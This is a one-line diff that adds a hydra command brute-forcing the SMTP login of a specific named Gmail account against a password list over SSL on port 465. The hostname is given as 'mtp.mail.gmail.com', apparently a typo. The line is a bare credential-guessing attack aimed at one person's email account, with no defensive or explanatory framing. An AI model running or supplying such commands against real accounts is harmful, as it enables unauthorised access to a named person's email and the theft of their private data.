@@ -1,0 +1,1 @@
+hydra -l jpellerin123@gmail.com -P password.lst -s 465 -S -V -v -t 1 mtp.mail.gmail.com smtp
